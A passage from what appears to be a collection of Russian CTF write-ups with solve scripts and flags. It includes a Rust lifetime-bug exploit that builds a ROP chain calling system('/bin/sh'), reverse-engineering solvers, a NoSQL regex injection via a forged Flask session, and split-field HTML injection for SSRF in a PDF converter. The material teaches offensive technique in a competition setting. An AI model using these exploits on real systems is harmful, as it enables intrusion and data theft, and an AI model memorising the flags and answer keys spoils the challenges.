Макросы в расте, а конкретно `proc_macro`, это такие функции которые исполняются при компиляции. Они принимают на вход и возращают поток токенов (репрезентацию даннных компилятора). По сути они позволяют модифицировать код, превращая его в произвольный компилируемый код (к которому применяются все те же ограничения вроде lifetime и unsafe). В нашем случае происходить проверка на вызов только разрешенных макросов, функций и полный запрет unsafe, затем возращается тот же код. (гонка не возможна, потому что мы вставляет уже проверенный код, не читая из файла дважды).

# Как будем действовать

В языке rust накладываются строгие ограничения на код, которые не позволяют нам просто так написать на стек роп. В частности существует так называемый `borrow checker`, который проверяет что время жизни (далее lifetime) обьекта не превышает время жизни обьектов от которых он зависим, в частности время жизни ссылки на обьект не превышает время жизни самого обьекта. Именно это ограничение мы и будем обходить, чтобы получить исполнение произвольного кода с помощью [техники](https://github.com/Speykious/cve-rs/blob/main/src/lifetime_expansion.rs). Сама техника основано на баге компилятора, про нее можно прочитать в комментариях в соотвествующем файле. По сути она позволяет продлить lifetime любого обьекта до `'static` (статического "бесконечного" лайфайтам). Существует много разных способо использования этой техники для получения rce, мы раскажем лишь про один (возможно самый простой) из них.

# Heap leak, arbitrary read/write

Идея в том что мы получим один вектор у которого данные освобождены и указывают на другой вектор лежащий на хипе. Таким образом мы сможем прочитать (получая лик хипы) или записать указатель второго вектора (получая arbitrary read/write). Требуется получить вектор с `capacity == size` размера структуры вектора `std::mem::size_of::<Vec<u8>>() == 24`. Проще всего этого достигнуть использую вектор с элементом размера `3` (`Vec<[u8; 3]>`). Поскольку вектор [амортизированно](https://doc.rust-lang.org/src/alloc/raw_vec/mod.rs.html#571) растет [2 раза](https://doc.rust-lang.org/src/alloc/raw_vec/mod.rs.html#659), начиная с `1`, добавив 8 раз элемент в такой вектор получим вектор с размером буфера 24 байта. Затем аллоцируем вектор на хипе: сделаем вектор векторов из одного элемента (`vec![vec![1337u64]]`).
```rust
let v = {
    // создаем вектор со статическим lifetime с 
```
### solve\solve.rs
```rs
#[inline(never)]
pub const fn lifetime_translator<'a, 'b, T: ?Sized>(_val_a: &'a &'b (), val_b: &'b T) -> &'a T {
    val_b
}

#[inline(never)]
pub fn lifetime_translator_mut<'a, 'b, T: ?Sized>(
    _val_a: &'a &'b (),
    val_b: &'b mut T,
) -> &'a mut T {
    val_b
}

pub fn expand<'a, 'b, T: ?Sized>(x: &'a T) -> &'b T {
    let f: for<'x> fn(_, &'x T) -> &'b T = lifetime_translator;
    f(STATIC_UNIT, x)
}

pub fn expand_mut<'a, 'b, T: ?Sized>(x: &'a mut T) -> &'b mut T {
    let f: for<'x> fn(_, &'x mut T) -> &'b mut T = lifetime_translator_mut;
    f(STATIC_UNIT, x)
}

pub const STATIC_UNIT: &&() = &&();

fn main() {
    let v = {
        // создаем вектор со статическим lifetime с размером буфера 24 байт
        let mut a = Vec::with_capacity(8);
        for _ in 0..8 {
            a.push([0u8; 3]);
        }
        let r = &mut a;
        expand_mut(r)
    };

    // вектор векторов на хипе
    let mut vv = {
        let mut v = Vec::with_capacity(1);
        v.push({
            let mut v = Vec::with_capacity(1);
            v.push(31337u64);
            v
        });
        v
    };

    fn read_address(v: &[[u8; 3]]) -> u64 {
        // чтение 8 байт с оффсета 8 и превращение их в число
        let mut buf = [0u8; 8];
        for i in 0..8 {
            buf[i] = v[(i + 8) / 3][(i + 8) % 3];
        }
        u64::from_le_bytes(buf)
    }

    fn write_address(v: &mut [[u8; 3]], addr: u64) {
        // запись 8-байтового числа по оффсету 8
        let buf = addr.to_le_bytes();
        for i in 0..8 {
            v[(i + 8) / 3][(i + 8) % 3] = buf[i];
        }
    }

    let heap_leak = read_address(v);

    let mut arbitrary_read = |addr| -> u64 {
        write_address(v, addr);
        vv[0][0]
    };

    // println!("HEAP LEAK 0x{:x}", heap_leak);
    print(heap_leak);

    let mut libc_leak_address = heap_leak;
    while arbitrary_read(libc_leak_address) & 0xfff != 0x4e0 {
        libc_leak_address -= 8;
    }

    let libc_leak = arbitrary_read(libc_leak_address);
    let libc_base = libc_leak - 0x1e84e0;
    // println!("LIBC BASE 0x{:x}", libc_base);
    print(libc_base);
    let environ = arbitrary_read(libc_base + 0x1EEE28);
    // println!("ENVIRON 0x{:x}", environ);
    print(environ);
    let stack = environ - 0x300;

    let mut arbitrary_write = |addr, value| {
        write_address(v, addr);
        vv[0][0] = value;
    };

    let system = libc_base + 0x53110;
    let bin_sh = libc_base + 0x1A7EA4;
    let pop_rdi = libc_base + 0x2a145;
    let ret = libc_base + 0x2a145 + 1;
    arbitrary_write(stack, pop_rdi);
    arbitrary_write(stack + 8, bin_sh);
    arbitrary_write(stack + 16, ret);
    arbitrary_write(stack + 24, system);

    write_address(v, heap_leak);
}

```

##########################################################################################
# reverse/Wincrack
## README
# Wincrack | Reverse

## Информация

> Всё очень просто и понятно, надо найти флаг. 
>
> Формат флага: `ctfcup{}`


## Деплой

Не требуется

## Выдать участинкам

Файл из директории [public/](public/)

## Описание

Дефолтный crackme под Windows с антидебагом и кастомным алгоритмом шифрованя

## Решение

1. Смотрим TLS и видим там зарегистированный коллбек
2. Изучаем его и видим что он патчит определённый участок в бинаре
3. Патч представляет собой смену фейковой функции проверки флага на реальную
4. В реально функции проверки флаг мы используем для генерации ключей некоторый seed
5. Этот seed лежит внутри PEB и он будет корректный только если приложение было запущено без отладчика
6. Можно запатчить код TLS коллбека так чтобы генерация сида была успешной в любом случае
7. Ревёрсим алгоритм генерации ключа и шифрования и пишем расшифровщик

[Код расшифровки](solve/Source.cpp)

## Флаг

`ctfcup{0h_y0u_able_to_d3crypt_this_s00_its_n00t_s00_h4rd_Huh?}`

## SOLUTION FILES
- solve\Source.cpp
### solve\Source.cpp
```cpp
#include <cstdint>
#include <iostream>
#include <vector>
#include <algorithm>
#include <random>
#include <map>
#include <unordered_map>
#include <set>
#include <deque>
#include <string>
#include <fstream>
#include <windows.h>

// Markov Chain State for key generation
class MarkovChain {
private:
    std::map<std::pair<uint32_t, uint32_t>, std::vector<uint32_t>> transitions;
    std::mt19937 rng;
    uint32_t current_state;

public:
    MarkovChain(uint64_t seed) : rng(seed), current_state(0x1337) {
        // Initialize transition probabilities based on seed
        for (int i = 0; i < 256; ++i) {
            for (int j = 0; j < 256; ++j) {
                std::vector<uint32_t> next_states;
                for (int k = 0; k < 8; ++k) {
                    next_states.push_back((i * j + k + seed) % 0x10000);
                }
                transitions[{i, j}] = next_states;
            }
        }
    }

    uint32_t getNextState() {
        auto key = std::make_pair(current_state & 0xFF, (current_state >> 8) & 0xFF);
        if (transitions.find(key) != transitions.end()) {
            auto& possible_states = transitions[key];
            current_state = possible_states[rng() % possible_states.size()];
        }
        else {
            current_state = (current_state * 0x41C64E6D + 0x3039) & 0xFFFFFFFF;
        }
        return current_state;
    }
};

// Feistel Cipher Implementation
class FeistelCipher {
private:
    std::vector<uint32_t> round_keys;
    MarkovChain markov;

    uint32_t feistel_function(uint32_t right, uint32_t round_key) {
        // Complex Feistel function with multiple operations
        uint32_t temp = right;
        temp = ((temp << 13) | (temp >> 19)) ^ round_key;  // Rotate and XOR
        temp = ((temp * 0x9E3779B9) ^ 0x85EBCA6B) + 0x1337; // Multiply and add
        temp = ((temp << 7) | (temp >> 25)) ^ (round_key >> 8); // Another rotation
        return temp ^ (round_key & 0xFF);
    }

public:
    FeistelCipher(const std::vector<uint64_t>& seeds) : markov(seeds[0]) {
        // Generate round keys using Markov chain
        round_keys.reserve(16);
        for (int i = 0; i < 16; ++i) {
            round_keys.push_back(markov.getNextState());
        }
    }

    std::vector<uint32_t> encrypt(const std::vector<uint32_t>& plaintext) {
        std::vector<uint32_t> ciphertext = plaintext;

        for (int round = 0; round < 16; ++round) {
            for (size_t i = 0; i < ciphertext.size(); i += 2) {
                if (i + 1 < ciphertext.size()) {
                    uint32_t left = ciphertext[i];
                    uint32_t right = ciphertext[i + 1];

                    uint32_t new_left = right;
                    uint32_t new_right = left ^ feistel_function(right, round_keys[round]);

                    ciphertext[i] = new_left;
                    ciphertext[i + 1] = new_right;
                }
            }
        }

        return ciphertext;
    }

    std::vector<uint32_t> decrypt(const std::vect
```

##########################################################################################
# reverse/annabelle
## README
# reverse | annabelle

## Информация

В заброшенном доме вы находите проклятую куклу. Сможете ли вы узнать ее тайны?

## Выдать участинкам

Предоставьте исполняемый файл: [public/annabelle](public/annabelle).

## Описание

Простая матрешка, на каждом шаге меняющая флаг и проверяющая на совпадение в конце.

## Решение

Исполняемый файл аллоцирует 2 `rwx` буфера. В один записывает флаг и затем код, затем буфера чередуются, т.е. код в одном расшифровывает код и пишет в другой. Каждая ступень тривиально изменяет флаг. В конце флаг проверяется на равенство константе. Для решение нужно сначала расшифровать все стадии (используется `ARC4` с ключем - хешом от кода, что затрудняет отладку). Затем пройтись в обратном порядке и восстановить флаг на каждой стадии.

[решение](solve/solve.py)

## Флаг

ctfcup{c2f85700623151de5b4cfc78}

## SOLUTION FILES
- solve\gen.bin
- solve\solve.py
### solve\solve.py
```py
from typing import List
import re
import angr
import claripy
from Crypto.Cipher import ARC4
from pwn import disasm, context, u64

context.arch = "amd64"
context.log_level = "error"


def solve_stage(stage: bytes, target: bytes) -> bytes:
    proj = angr.Project("/bin/true", auto_load_libs=False)

    state = proj.factory.blank_state(addr=0x1000)

    flag = claripy.BVS(f"f", 32 * 8)
    stage = bytearray(stage)
    code_len = u64(stage[0:8])

    rdi = 0x1000
    state.memory.store(rdi, flag)
    state.memory.store(rdi + 32, stage)

    rsi = 0x100000
    state.memory.store(rsi, b"\x00" * 32)
    state.memory.store(rsi + 32, stage)
    state.regs.rip = rdi + 48 + 0x119 - 16
    state.regs.rdi = rdi
    state.regs.rsi = rsi
    state.regs.rsp = 0x300000
    state.regs.rsp = state.regs.rsp + 264

    # state.memory.store(0x1000, code)

    simgr = proj.factory.simulation_manager(state)
    simgr.explore(find=rdi + 48 + code_len - 2)

    final_state = simgr.found[0]
    actual_output = final_state.memory.load(rsi, 32)
    solution = final_state.solver.eval(
        flag, extra_constraints=[actual_output == target]
    )
    solution_bytes = solution.to_bytes(32, "big")
    return solution_bytes


def hash_stage(data: bytes, start: int, mul: int) -> bytes:
    res = start
    for el in data:
        res ^= el
        res *= mul
        res %= 2**64
    return res.to_bytes(8, "little")


def decrypt_stages(data: bytes) -> List[bytes]:
    stages = [data]
    while True:
        if u64(stages[-1][0:8]) == 0:
            break
        code_len = u64(stages[-1][0:8])
        data_len = u64(stages[-1][8:16])
        d = disasm(stages[-1][16 : 16 + 50], arch="amd64")
        start = int(re.search(r"movabs\s*rax,\s*(.*)", d).group(1), 0)
        mul = int(re.search(r"imul\s*rax,\s*rax, (.*)", d).group(1), 0)
        hash = hash_stage(stages[-1][16 : 16 + code_len], start, mul)
        cipher = ARC4.new(hash)
        stages.append(
            cipher.decrypt(stages[-1][16 + code_len : 16 + code_len + data_len])
        )

    return stages


def get_final_target(stage: bytes) -> bytes:
    d = disasm(stage[16:])
    return bytes(int(i, 0) for i in re.findall(r"mov\s*cl,\s*(.*)", d))


def main():
    with open("gen.bin", "rb") as f:
        data = f.read()

    stages = decrypt_stages(data)
    final_stage = stages[-1]
    stages = stages[:-1]
    target = get_final_target(final_stage)
    for stage in reversed(stages):
        print(target)
        target = solve_stage(stage, target)
    print(target)


if __name__ == "__main__":
    main()

```

##########################################################################################
# reverse/nanomachines
## README
# reverse | nanomachines

## Информация

nanomachines, son.

## Выдать участинкам

Предоставьте исполняемый файл: [public/nanomachines](public/nanomachines).

## Описание

Крекшишка с эллиптикой на наномитой.

## Решение

Крекмишка на расте по сути представляет из себя код, который считывает `x` точки на эллиптической кривой, вычисляет `y` (кривая без коэфициента при `y`) возводит ее в степень `31337`, переводя в якобианские координаты, и проверяет на равенство заданным координатам. Для арифметических операций используется техника наномитов, при исполнении программа дебагает свой форк, при получениии сигнала `SIGSEGV`, отладчик проводит арифметические операции с данными, указатели на которые лежат в регистрах. Чтобы обратить операцию необходимо просто возвести в степень `31337 ^ (-1) (mod C.order())`. Кривая суперсингулярна, поэтому ее порядок считается.

[решение](solve/solve.py)

## Флаг

ctfcup{3a960ee0a9ea837002f7c981b15b0fea}

## SOLUTION FILES
- solve\solve.py
### solve\solve.py
```py
from sage.all import *

X = int.from_bytes(
    b"b\x0eh\x88b)-:\xe22\xa8K\xe3\xfc\xf4C\xfeL\xe3\x84\xd9O\x8d5\xaa\x1a$\xfb\x1c\x91+\xa1\xd4\xa5\x18\x14\x12cZ\x8f\x8e<\x8d\x0c\xa4\xa1Mg\\\xca\x96P\xe9\x7f\x82p\xbf\x81\xa3!\xa2\xdb\x8e1\x14U\xe1'1\xe9\xbb\x87-b\x12<4\xdco\x03s\x80\xffF\x90\x90\xd5\x8f\xbb\xac\xd4\xb0\xb4\xae\xd9~\x1a@\x8c\x81\x88\x984i\xe1\xb1\xf9\x8c\xb8\\>S\x8a\xe4&\r\xa3\xf4\xdd{R\xfe;\"p\x83f~",
    byteorder="little",
)
Y = int.from_bytes(
    b"2\x04\xd3\x9f\xd0\xd8\x98\x1djw\x8c\xc7\xa0\x0b4\xb3\x1b\x01\xe8\xbd\xfe\x17F\x85\xab\xaf^\x91\x14/\x05\xbe\xa1\xd8\xb6u?l\xa1\x04\xfe\x95\xf1\xb9\xe1\x9e1\xbc\xf0\x17d\xa1\x95N\x1c>\xe5\xce\xa2\x94\x9fkm\x18\xc2\x98\xd6G\xde\t+\x86\xd9\xc5\x8a\x02\x0c\x97T\x05m0\x8c\x8ae\xe4X\xc0\xf3\xf2\xb6\xffw\xa5C\xe6C\x14\x90\xb2\xa4\x0e\xb5\x11i\xe7\x88$\x0f\xbd\xd5_\x01\xa5\x85\xfcW\xb08;]E\x08|XL\xc0\x9c",
    byteorder="little",
)


P = int.from_bytes(
    b'\x0b\x90\xb3\x14\x82\xb56F\xed\xda"\xe9\x9bM\x8b\xd9\x9f^\xe6\xb3\xdb\xba\x95\x8f^\xbc\x144\xe6\xa1\xc2~\x1em\xad\xffe\xf0\xa7?,\xc7m\xba8X\xe6\xce\xea\xbb\x05\x01\x93\x1d\x81\x9b\xfe\xec0\x1a\xec\xfe\x01\x1e\xea\x89[\xf9\x8f\x19;\xf9\x8750\x1e\xd5\x9f}\xace\x8e\x88\x0fKp1\xfbo\x90JVE\xe4v\x12\xc17\xeav\t\\m/\xe3\xceI\xedG\xc7\xcf\x87(3y\n\x87\xf2\xdd\xc1\x1b\xf0 {\xcb\n\x1c\x9e',
    byteorder="little",
)

F = GF(P)
C = EllipticCurve(F, [1337, 0])


def main():
    point = C(X, Y)
    flag_point = point * (pow(31337, -1, C.order()))
    print(int(flag_point.x()).to_bytes(128, byteorder="little"))


if __name__ == "__main__":
    main()

```

##########################################################################################
# web/goose
## README
# web | goose

## Информация

Untitled goose task.

## Деплой

```sh
cd deploy
docker compose -p goose up --build -d
```

## Выдать участинкам

Предоставьте зип архив: [public/goose.zip](public/goose.zip).

## Описание


## Решение

[Подробрное решение](solve/solve.py)

## Флаг

TBD

## SOLUTION FILES
- solve\server.py
- solve\solve.py
### solve\server.py
```py
from flask import Flask, session, request

app = Flask(__name__)
app.config["SECRET_KEY"] = "kluchik"


@app.route("/", methods=["POST"])
def index():
    session.update(request.json)
    return "a"


app.run()

```
### solve\solve.py
```py
import requests
import sys

URL = sys.argv[1]

AL = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-{}"


def main():
    def check_prefix(prefix):
        prefix = prefix.replace("{", "\\{").replace("}", "\\}")
        r = requests.session()
        r.post("http://localhost:5000", json={"content": {"$regex": f"^{prefix}"}})
        session = r.cookies["session"]
        return (
            requests.get(f"{URL}/strings", cookies={"session": session})
            .json()
            .get("error")
            is not None
        )

    flag_prefix = "ctfcup{"
    while True:
        for c in AL:
            if check_prefix(flag_prefix + c):
                flag_prefix += c
                break
        print(flag_prefix)


if __name__ == "__main__":
    main()

```

##########################################################################################
# web/goose-revenge
## README
# web | goose

## Информация

Untitled goose task.

## Деплой

```sh
cd deploy
docker compose -p goose up --build -d
```

## Выдать участинкам

Предоставьте зип архив: [public/goose.zip](public/goose.zip).

## Описание


## Решение

[Подробрное решение](solve/solve.py)

## Флаг

TBD

## SOLUTION FILES
- solve\server.py
- solve\solve.py
### solve\server.py
```py
from flask import Flask, session, request

app = Flask(__name__)
app.config["SECRET_KEY"] = "kluchik"


@app.route("/", methods=["POST"])
def index():
    session.update(request.json)
    return "a"


app.run()

```
### solve\solve.py
```py
import requests
import sys

URL = sys.argv[1]

AL = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-{}"


def main():
    def check_prefix(prefix):
        prefix = prefix.replace("{", "\\{").replace("}", "\\}")
        r = requests.session()
        r.post("http://localhost:5000", json={"content": {"$regex": f"^{prefix}"}})
        session = r.cookies["session"]
        return (
            requests.get(f"{URL}/strings", cookies={"session": session})
            .json()
            .get("error")
            is not None
        )

    flag_prefix = "ctfcup{"
    while True:
        for c in AL:
            if check_prefix(flag_prefix + c):
                flag_prefix += c
                break
        print(flag_prefix)


if __name__ == "__main__":
    main()

```

##########################################################################################
# web/trustmebroker
## README

# Описание | Уровень | Категория

## Информация

> Брокерский офис принимает новых клиентов — бумаги подписываются быстро, а результаты не всегда предсказуемы.
> 
> http://<ip>:3355

## Деплой

Указываем команду необходимую для запуска задачи на сервере

```sh
cd deploy
docker-compose up --build -d
```

## Выдать участинкам

Архив из директории [public/](public/) и IP:PORT сервера

## Описание

SSRF via HTML to PDF headless convertor + creative HTML filter bypass 

## Решение

Подробное решение от автора

[Эксплоит](solve/solve.py)

## Флаг

`ctfcup{61d402f23f8f16637cff1c08f303bebc9a9eaf19abf056f988fcab69ef43}`


## SOLUTION FILES
- deploy\pdf\node_modules\pac-resolver\dist\dnsResolve.d.ts
- deploy\pdf\node_modules\pac-resolver\dist\dnsResolve.d.ts.map
- deploy\pdf\node_modules\pac-resolver\dist\dnsResolve.js
- deploy\pdf\node_modules\pac-resolver\dist\dnsResolve.js.map
- solve\README.md
- solve\exploit.py
### deploy\pdf\node_modules\pac-resolver\dist\dnsResolve.js
```js
"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const util_1 = require("./util");
/**
 * Resolves the given DNS hostname into an IP address, and returns it in the dot
 * separated format as a string.
 *
 * Example:
 *
 * ``` js
 * dnsResolve("home.netscape.com")
 *   // returns the string "198.95.249.79".
 * ```
 *
 * @param {String} host hostname to resolve
 * @return {String} resolved IP address
 */
async function dnsResolve(host) {
    const family = 4;
    try {
        const r = await (0, util_1.dnsLookup)(host, { family });
        if (typeof r === 'string') {
            return r;
        }
    }
    catch (err) {
        // @ignore
    }
    return null;
}
exports.default = dnsResolve;
//# sourceMappingURL=dnsResolve.js.map
```
### solve\README.md
```md
## trustmebroker writeup

Для решения таска, нужно было обратить внимание, что `/step2` преобразует JSON не в структуру, а в `map[string]string`. Это намекает на то, что сервер может излишне доверять пользовательскому вводу. Более того, после обработки в сервисе `web`, `map[string]string` снова превращается в JSON и отправляется в PDF генератор. Подозрительно, не правда ли?

Беря во внимание то, что кроме генерации PDF функционала нет и существует сервис `admin` (в docker-compose), с которым никак не взаимодействует основной сервис, гуглим `PDF Converter pentest` и понимаем, что для решения необходимо получить ssrf.

Пробуем заинжектить HTML в value передаваемого на сервер JSON, однако жесткая фильтрация не дает этого сделать.

```
func sanitize(a string) string {
	a = strings.ReplaceAll(a, "<", "")
	a = strings.ReplaceAll(a, ">", "")
	a = strings.ReplaceAll(a, "\"", "")
	a = strings.ReplaceAll(a, "'", "")
	a = strings.ReplaceAll(a, "\\", "")
	cut := 17
	if len(a) < 17 {
		cut = len(a)
	}
	a = a[:cut]
	return a
}
```

Вспоминаем, что засчет каста к `map[string]string` есть возможность добавить произвольное поле в JSON объект и оно попадет в PDF генератор. Передаем произвольное поле, например `..., 'a':'b'}` и видим что все `a` в сгенерированном документе заменились на `b`, вероятно поплыла верстка. И тут мы переходим к сути. 

Обход фильтрации заключается в том, что хоть мы и не можем добавлять теги, мы можем заинжектить нужный нам HTML внутрь другого тега. 

Однако ограничение на 17 (rip) символов ввода все ещё не дает развернуться полноценно. Обходится это рекурсивной сборкой пэйлоада из нескольких полей. Например:

```
{
  "body":"iframe height=kek",
  "kek":"800 width=800 lwe",
  "lwe":"src=http://locmsa"
  "msa":"alhost:9090/agzzz", // или admin:9090
  "zzz":"reements",
  "email":"test@test.test",
  "firstname":"1",
  "middlename":"2",
  "birthdate":"2017-12-12",
  "passport_series":"123",
  "passport_number":"1",
  "passport_issued_by":"2",
  "passport_issued_date":"2012-12-12",
  "address":"1",
  "agree":"1",
  "lastname":"test"
}
```

Ещё мне понравился вариант @enabling:

```
{"h1":"xn | * src=xz:xc","xz":"http://127.0.0.1","xc":"9090/agreements$","xn":"iframe","|":"width=700","*":"height=2000","$":"?page=1"}
```

После этого получаем ssrf, попадаем в админку, видим кнопку "Договоры на рассмотрении", идем на `/agreements?page=x`, находим первую запись в DB, копируем номер договора, вставляем его в куку agreement_id и получаем флаг:

<img width="700" alt="image" src="https://github.com/user-attachments/assets/8f865f23-c09d-43ce-837f-47a7b62e1601" />


flag: `ctfcup{61d402f23f8f16637cff1c08f303bebc9a9eaf19abf056f988fcab69ef43}`

```
### solve\exploit.py
```py
import requests

json_data = {"h1":"xn | * src=xz:xc","xz":"http://admin","xc":"9090/agreements$","xn":"iframe",
"|":"width=700","*":"height=2000","$":"?page=asd"
,"firstname":"1","middlename":"2","birthdate":"2012-12-12","email":"a@a.ru","passport_series":"document.body.innerHTML=``","passport_number":"1","passport_issued_by":"2","passport_issued_date":"2012-12-12","address":"1","agree":"1","lastname":"e<s>"}

response = requests.post('http://localhost:8080/register/step2', json=json_data)

print(response.text)

```